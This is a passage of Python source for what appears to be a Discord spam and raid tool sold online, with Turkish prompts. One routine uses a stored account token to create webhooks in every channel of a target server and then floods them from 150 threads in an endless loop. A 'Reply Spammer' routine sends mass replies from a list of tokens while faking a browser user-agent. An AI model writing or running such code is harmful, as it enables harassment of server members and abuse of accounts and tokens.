                        Write.Print(wbhook[:60] + "******\n", Colors.purple_to_red, interval=0.000)
                        with open("data/temp_webhooks.txt", "a+", encoding='utf-8') as f:
                            f.write(wbhook + "\n")
            
            def send_message(webhook, message, headers):
                payload = {
                    "content": message
                }
                data_json = json.dumps(payload)
                headers = {
                    "Content-Type": "application/json"
                }
                r = session.post(webhook, data=data_json, headers=headers)
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sent Message {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(webhook[:60] + "*******\n", Colors.purple_to_red, interval=0.000)
            
            def main():
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                Write.Print(f"message ~> ", Colors.purple_to_red, interval=0.000); message = input()
                print()

                headers = {
                    "Authorization": token_s
                }

                url = f'https://discord.com/api/v10/guilds/{server_id}/channels'
                r = session.get(url=url, headers=headers).json()

                threads = []

                for a in r:
                    channel_id = a['id']
                    webhook_thread = threading.Thread(target=create_webhook, args=(channel_id,headers,))
                    threads.append(webhook_thread)
                    webhook_thread.start()

                for thread in threads:
                    thread.join()
                
                headers = {
                    "Authorization": token_s
                }

                url = f'https://discord.com/api/v10/guilds/{server_id}/channels'
                r = session.get(url=url, headers=headers).json()

                threads = []

                for a in r:
                    channel_id = a['id']
                    webhook_thread1 = threading.Thread(target=get_webhooks, args=(channel_id,headers,))
                    threads.append(webhook_thread1)
                    webhook_thread1.start()

                for thread in threads:
                    thread.join()
                time.sleep(1)
                with open("data/temp_webhooks.txt", "r") as webhooks:
                    webhook_list = webhooks.readlines()
                def run_webhook():
                    while True:
                        webhook = random.choice(webhook_list)
                        send_message(webhook.strip(), message, headers)
                        time.sleep(0.001)
                            
                threads = []
                for _ in range(150):
                    thread = threading.Thread(target=run_webhook)
                    threads.append(thread)
                    thread.start()

                for thread in threads:
                    thread.join()
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")
            os.remove("data/temp_webhooks.txt")
        else:
            
            os.remove("data/temp_token.txt")
        
        if command == '6':
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy  | ITEMSATIS : https://www.itemsatis.com/p/CinxrrModzzz |  Reply Spammer')
            Write.Print(f"\n[+] KANAL İD ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
            Write.Print(f"[+] MESAJ İD ~> ", Colors.purple_to_red, interval=0.000); msg_id = input()
            Write.Print(f"[+] MESAJ ~> ", Colors.purple_to_red, interval=0.000); msg = input()
            Write.Print(f"[+] KAÇ ADET ~> ", Colors.purple_to_red, interval=0.000); howmany = input()
        amount = int(howmany)
        output_lock = threading.Lock()
        print()

        def reply_spammer(token, channel_id, message_id, msg, amount):
            for i in range(int(amount)):
                payload = {
                    'content': msg, 
                    'tts':False
                }

                headers = {
                    'authorization': token,
                    "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                }

                payload['message_reference'] = {
                    "channel_id": channel_id,
                    "message_id": message_id
                }
                r = session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Replied {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass
                elif r.status_code == 429:
                    try:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Ratelimited {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                            pass
                    except:
                        pass
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass
        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=reply_spammer, args=(token, channel_id, msg_id, msg, amount)).start()

        Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        
            
            
            
        display_menu()
    
    else:
        print('[-] Lutfen Dogru Rakam Giriniz') 

while True:
    display_menu()
    command = input('> ')

    if command.lower() == 'exit':
        break

    execute_command(command)